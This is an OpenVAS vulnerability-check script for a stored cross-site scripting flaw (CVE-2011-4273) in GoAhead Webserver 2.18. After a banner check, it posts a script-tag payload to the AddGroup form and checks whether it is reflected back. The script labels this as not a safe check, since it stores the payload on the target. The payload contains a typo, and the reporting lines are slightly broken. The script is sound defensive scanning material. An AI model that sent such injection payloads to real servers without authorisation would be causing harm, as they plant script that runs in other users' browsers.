###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_goahead_webserver_mult_stored_xss_vuln.nasl 7019 2017-08-29 11:51:27Z teissa $
#
# GoAhead Webserver Multiple Stored Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802270");
  script_version("$Revision: 7019 $");
  script_cve_id("CVE-2011-4273");
  script_bugtraq_id(50039);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"creation_date", value:"2011-11-08 16:16:16 +0530 (Tue, 08 Nov 2011)");
  script_tag(name:"last_modification", value:"$Date: 2017-08-29 13:51:27 +0200 (Tue, 29 Aug 2017) $");
  script_name("GoAhead Webserver Multiple Stored Cross Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/384427");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("GoAhead-Webs/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session
  in the context of an affected site.

  Impact Level: Application");
  script_tag(name:"affected", value:"GoAhead Webserver version 2.18");
  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied
  input via the 'group' parameter to goform/AddGroup, related to addgroup.asp,
  the 'url' parameter to goform/AddAccessLimit, related to addlimit.asp,
  or the 'user' or 'group' parameter to goform/AddUser, related to adduser.asp");
  script_tag(name:"solution", value:"Update to version 2.5 or later,
  For updates refer to http://www.goahead.com/products/webserver/default.aspx");
  script_tag(name:"summary", value:"This host is running GoAhead Webserver and is prone to multiple
  stored cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Banner And Confirm Application
banner = get_http_banner(port:port);
if("Server: GoAhead-Webs" >!< banner) {
  exit(0);
}

## Stored XSS (Not a safe check)
if(safe_checks()){
  exit(0);
}

url = "/goform/AddGroup/addgroup.asp";

## Construct Attack Request
req = http_post(port:port, item:url, data:"group=<script>alert(doucment.cookie)</script>" +
                     "&privilege=4&method=1&enabled=on&ok=OK");
## Try XSS Attack
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(res =~ "HTTP/1\.. 200" && "<script>alert(doucment.cookie)</script>" >< res){
  report = report = report_vuln_url(port:port, url:url);
  security_message(port:port);
  exit(0);
}

exit(99);
